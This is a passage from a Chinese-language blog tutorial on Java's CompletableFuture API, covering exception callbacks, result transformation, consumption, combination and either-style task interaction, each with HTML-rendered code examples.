class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> Random().nextInt(<span class="number">10</span>) % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">12</span> / <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"执行结束！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"test"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 任务完成或异常方法完成时执行该方法</span></span><br><span class="line"><span class="comment">// 如果出现了异常,任务结果为null</span></span><br><span class="line">future.whenComplete(<span class="keyword">new</span> BiConsumer&lt;String, Throwable&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(String t, Throwable action)</span> </span>&#123;</span><br><span class="line">        System.out.println(t+<span class="string">" 执行完成！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 出现异常时先执行该方法</span></span><br><span class="line">future.exceptionally(<span class="keyword">new</span> Function&lt;Throwable, String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">apply</span><span class="params">(Throwable t)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"执行失败："</span> + t.getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"异常xxxx"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">future.get();</span><br></pre></td></tr></table></figure><p>上面的代码当出现异常时，输出结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行失败：java.lang.ArithmeticException: &#x2F; by zero</span><br><span class="line">null 执行完成！</span><br></pre></td></tr></table></figure><h2 id="二、应用场景"><a href="#二、应用场景" class="headerlink" title="二、应用场景"></a>二、应用场景</h2><h3 id="2-1-结果转换"><a href="#2-1-结果转换" class="headerlink" title="2.1 结果转换"></a>2.1 结果转换</h3><p>将上一段任务的执行结果作为下一阶段任务的入参参与重新计算，产生新的结果。</p><h4 id="thenApply"><a href="#thenApply" class="headerlink" title="thenApply"></a>thenApply</h4><p><code>thenApply</code>接收一个函数作为参数，使用该函数处理上一个<code>CompletableFuture</code>调用的结果，并返回一个具有处理结果的<code>Future</code>对象。</p><p>常用使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletableFuture&lt;U&gt; <span class="title">thenApply</span><span class="params">(Function&lt;? <span class="keyword">super</span> T,? extends U&gt; fn)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> &lt;U&gt; CompletableFuture&lt;U&gt; <span class="title">thenApplyAsync</span><span class="params">(Function&lt;? <span class="keyword">super</span> T,? extends U&gt; fn)</span></span></span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">100</span>;</span><br><span class="line">    System.out.println(<span class="string">"第一次运算："</span> + result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;).thenApply(number -&gt; &#123;</span><br><span class="line">    <span class="keyword">int</span> result = number * <span class="number">3</span>;</span><br><span class="line">    System.out.println(<span class="string">"第二次运算："</span> + result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="thenCompose"><a href="#thenCompose" class="headerlink" title="thenCompose"></a>thenCompose</h4><p><code>thenCompose</code>的参数为一个返回<code>CompletableFuture</code>实例的函数，该函数的参数是先前计算步骤的结果。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletableFuture&lt;U&gt; <span class="title">thenCompose</span><span class="params">(Function&lt;? <span class="keyword">super</span> T, ? extends CompletionStage&lt;U&gt;&gt; fn)</span></span>;</span><br><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletableFuture&lt;U&gt; <span class="title">thenComposeAsync</span><span class="params">(Function&lt;? <span class="keyword">super</span> T, ? extends CompletionStage&lt;U&gt;&gt; fn)</span> </span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; future = CompletableFuture</span><br><span class="line">    .supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">30</span>);</span><br><span class="line">            System.out.println(<span class="string">"第一次运算："</span> + number);</span><br><span class="line">            <span class="keyword">return</span> number;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .thenCompose(<span class="keyword">new</span> Function&lt;Integer, CompletionStage&lt;Integer&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> CompletionStage&lt;Integer&gt; <span class="title">apply</span><span class="params">(Integer param)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">int</span> number = param * <span class="number">2</span>;</span><br><span class="line">                    System.out.println(<span class="string">"第二次运算："</span> + number);</span><br><span class="line">                    <span class="keyword">return</span> number;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h4 id="thenApply-和-thenCompose的区别："><a href="#thenApply-和-thenCompose的区别：" class="headerlink" title="thenApply 和 thenCompose的区别："></a><strong>thenApply 和 thenCompose的区别</strong>：</h4><ul><li><code>thenApply</code>转换的是泛型中的类型，返回的是同一个<code>CompletableFuture</code>；</li><li><code>thenCompose</code>将内部的<code>CompletableFuture</code>调用展开来并使用上一个<code>CompletableFutre</code>调用的结果在下一步的<code>CompletableFuture</code>调用中进行运算，是生成一个新的<code>CompletableFuture</code>。</li></ul><h3 id="2-2-结果消费"><a href="#2-2-结果消费" class="headerlink" title="2.2 结果消费"></a>2.2 结果消费</h3><p>与结果处理和结果转换系列函数返回一个新的CompletableFuture不同，结果消费系列函数只对结果执行Action，而不返回新的计算值。</p><p>根据对结果的处理方式，结果消费函数又可以分为下面三大类：</p><ul><li>thenAccept()：对单个结果进行消费</li><li>thenAcceptBoth()：对两个结果进行消费</li><li>thenRun()：不关心结果，只对结果执行Action</li></ul><h4 id="thenAccept"><a href="#thenAccept" class="headerlink" title="thenAccept"></a>thenAccept</h4><p>观察该系列函数的参数类型可知，它们是函数式接口Consumer，这个接口只有输入，没有返回值。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">thenAccept</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> T&gt; action)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">thenAcceptAsync</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> T&gt; action)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Void&gt; future = CompletableFuture</span><br><span class="line">    .supplyAsync(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">"第一次运算："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;).thenAccept(number -&gt;</span><br><span class="line">                  System.out.println(<span class="string">"第二次运算："</span> + number * <span class="number">5</span>));</span><br></pre></td></tr></table></figure><h4 id="thenAcceptBoth"><a href="#thenAcceptBoth" class="headerlink" title="thenAcceptBoth"></a>thenAcceptBoth</h4><p><code>thenAcceptBoth</code>函数的作用是，当两个<code>CompletionStage</code>都正常完成计算的时候，就会执行提供的<code>action</code>消费两个异步的结果。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletionStage&lt;Void&gt; <span class="title">thenAcceptBoth</span><span class="params">(CompletionStage&lt;? extends U&gt; other,BiConsumer&lt;? <span class="keyword">super</span> T, ? <span class="keyword">super</span> U&gt; action)</span></span>;</span><br><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletionStage&lt;Void&gt; <span class="title">thenAcceptBothAsync</span><span class="params">(CompletionStage&lt;? extends U&gt; other,BiConsumer&lt;? <span class="keyword">super</span> T, ? <span class="keyword">super</span> U&gt; action)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; futrue1 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"任务1结果："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"任务2结果："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">futrue1.thenAcceptBoth(future2, <span class="keyword">new</span> BiConsumer&lt;Integer, Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Integer x, Integer y)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"最终结果："</span> + (x + y));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="thenRun"><a href="#thenRun" class="headerlink" title="thenRun"></a>thenRun</h4><p><code>thenRun</code>也是对线程任务结果的一种消费函数，与<code>thenAccept</code>不同的是，<code>thenRun</code>会在上一阶段 <code>CompletableFuture</code>计算完成的时候执行一个<code>Runnable</code>，而<code>Runnable</code>并不使用该<code>CompletableFuture</code>计算的结果。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">thenRun</span><span class="params">(Runnable action)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">thenRunAsync</span><span class="params">(Runnable action)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Void&gt; future = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>);</span><br><span class="line">    System.out.println(<span class="string">"第一阶段："</span> + number);</span><br><span class="line">    <span class="keyword">return</span> number;</span><br><span class="line">&#125;).thenRun(() -&gt;</span><br><span class="line">           System.out.println(<span class="string">"thenRun 执行"</span>));</span><br></pre></td></tr></table></figure><h3 id="2-3-结果组合"><a href="#2-3-结果组合" class="headerlink" title="2.3 结果组合"></a>2.3 结果组合</h3><h4 id="thenCombine"><a href="#thenCombine" class="headerlink" title="thenCombine"></a>thenCombine</h4><p>合并两个线程任务的结果，并进一步处理。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;U,V&gt; <span class="function">CompletableFuture&lt;V&gt; <span class="title">thenCombine</span><span class="params">(CompletionStage&lt;? extends U&gt; other,BiFunction&lt;? <span class="keyword">super</span> T,? <span class="keyword">super</span> U,? extends V&gt; fn)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> &lt;U,V&gt; <span class="function">CompletableFuture&lt;V&gt; <span class="title">thenCombineAsync</span><span class="params">(CompletionStage&lt;? extends U&gt; other,BiFunction&lt;? <span class="keyword">super</span> T,? <span class="keyword">super</span> U,? extends V&gt; fn)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> &lt;U,V&gt; <span class="function">CompletableFuture&lt;V&gt; <span class="title">thenCombineAsync</span><span class="params">(CompletionStage&lt;? extends U&gt; other,BiFunction&lt;? <span class="keyword">super</span> T,? <span class="keyword">super</span> U,? extends V&gt; fn, Executor executor)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; future1 = CompletableFuture</span><br><span class="line">    .supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>);</span><br><span class="line">            System.out.println(<span class="string">"任务1结果："</span> + number);</span><br><span class="line">            <span class="keyword">return</span> number;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">CompletableFuture&lt;Integer&gt; future2 = CompletableFuture</span><br><span class="line">    .supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>);</span><br><span class="line">            System.out.println(<span class="string">"任务2结果："</span> + number);</span><br><span class="line">            <span class="keyword">return</span> number;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">CompletableFuture&lt;Integer&gt; result = future1</span><br><span class="line">    .thenCombine(future2, <span class="keyword">new</span> BiFunction&lt;Integer, Integer, Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">apply</span><span class="params">(Integer x, Integer y)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">System.out.println(<span class="string">"组合后结果："</span> + result.get());</span><br></pre></td></tr></table></figure><h3 id="2-4-任务交互"><a href="#2-4-任务交互" class="headerlink" title="2.4 任务交互"></a>2.4 任务交互</h3><p>线程交互指<strong>将两个线程任务获取结果的速度相比较，按一定的规则进行下一步处理</strong>。</p><h4 id="applyToEither"><a href="#applyToEither" class="headerlink" title="applyToEither"></a>applyToEither</h4><p>两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的转化操作。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletionStage&lt;U&gt; <span class="title">applyToEither</span><span class="params">(CompletionStage&lt;? extends T&gt; other,Function&lt;? <span class="keyword">super</span> T, U&gt; fn)</span></span>;</span><br><span class="line"><span class="keyword">public</span> &lt;U&gt; <span class="function">CompletionStage&lt;U&gt; <span class="title">applyToEitherAsync</span><span class="params">(CompletionStage&lt;? extends T&gt; other,Function&lt;? <span class="keyword">super</span> T, U&gt; fn)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; future1 = CompletableFuture</span><br><span class="line">    .supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(number);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"任务1结果:"</span> + number);</span><br><span class="line">            <span class="keyword">return</span> number;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"任务2结果:"</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">future1.applyToEither(future2, <span class="keyword">new</span> Function&lt;Integer, Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">apply</span><span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"最快结果："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="acceptEither"><a href="#acceptEither" class="headerlink" title="acceptEither"></a>acceptEither</h4><p>两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的消费操作。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">acceptEither</span><span class="params">(CompletionStage&lt;? extends T&gt; other,Consumer&lt;? <span class="keyword">super</span> T&gt; action)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">acceptEitherAsync</span><span class="params">(CompletionStage&lt;? extends T&gt; other,Consumer&lt;? <span class="keyword">super</span> T&gt; action)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"第一阶段："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"第二阶段："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">future1.acceptEither(future2, <span class="keyword">new</span> Consumer&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"最快结果："</span> + number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="runAfterEither"><a href="#runAfterEither" class="headerlink" title="runAfterEither"></a>runAfterEither</h4><p>两个线程任务相比较，有任何一个执行完成，就进行下一步操作，不关心运行结果。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">runAfterEither</span><span class="params">(CompletionStage&lt;?&gt; other,Runnable action)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> CompletionStage&lt;Void&gt; <span class="title">runAfterEitherAsync</span><span class="params">(CompletionStage&lt;?&gt; other,Runnable action)</span></span>;</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 